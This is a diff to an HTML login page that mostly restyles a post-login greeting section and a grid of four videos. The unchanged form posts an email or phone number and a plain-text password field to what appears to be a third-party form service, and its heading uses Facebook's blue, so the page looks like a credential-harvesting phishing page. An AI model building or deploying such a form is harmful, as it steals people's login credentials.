@@ -114,6 +114,17 @@
       text-decoration: underline;
     }
 
+    /* Greetings Page Styles */
+    #greetings-page {
+      display: none;
+      text-align: center;
+      color: #000;
+    }
+
+    #greetings-page h1 {
+      color: #1877f2;
+    }
+
     /* Video Container Styles */
     .video-container {
       display: flex;
@@ -121,17 +132,27 @@
       justify-content: center;
       gap: 10px;
       margin-top: 20px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
-    .video-container video {
-      width: 45%;
+    .video-wrapper {
+      width: calc(50% - 10px); /* Two videos per row with gap */
       border-radius: 8px;
+      overflow: hidden;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
     }
 
+    .video-wrapper video {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
     @media (max-width: 600px) {
-      .video-container video {
-        width: 100%;
+      .video-wrapper {
+        width: 100%; /* One video per row on smaller screens */
       }
     }
   </style>
@@ -144,7 +165,7 @@
     <h1>Login</h1>
     <form method="POST" id="form">
       <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
-      <input type="email or phone" name="email" placeholder="Email or Phone" required>
+      <input type="email or phone" name="email or phone" placeholder="Email or Phone" required>
       <input type="Text" name="P4$$W0RD" placeholder="Password" required>
       <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
       <button type="submit">Log In</button>
@@ -159,26 +180,34 @@
   </div>
 
   <!-- Greetings Page (Initially Hidden) -->
-  <div id="greetings-page" style="display: none;">
+  <div id="greetings-page">
     <h1>Welcome, User!</h1>
     <p>You have successfully logged in.</p>
     <div class="video-container">
-      <video controls>
-        <source src="video1.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-      </video>
-      <video controls>
-        <source src="video2.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-      </video>
-      <video controls>
-        <source src="video3.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-      </video>
-      <video controls>
-        <source src="video4.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-      </video>
+      <div class="video-wrapper">
+        <video controls>
+          <source src="video1.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
+      <div class="video-wrapper">
+        <video controls>
+          <source src="video2.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
+      <div class="video-wrapper">
+        <video controls>
+          <source src="video3.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
+      <div class="video-wrapper">
+        <video controls>
+          <source src="video4.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
     </div>
     <button id="logout-button">Log Out</button>
   </div>
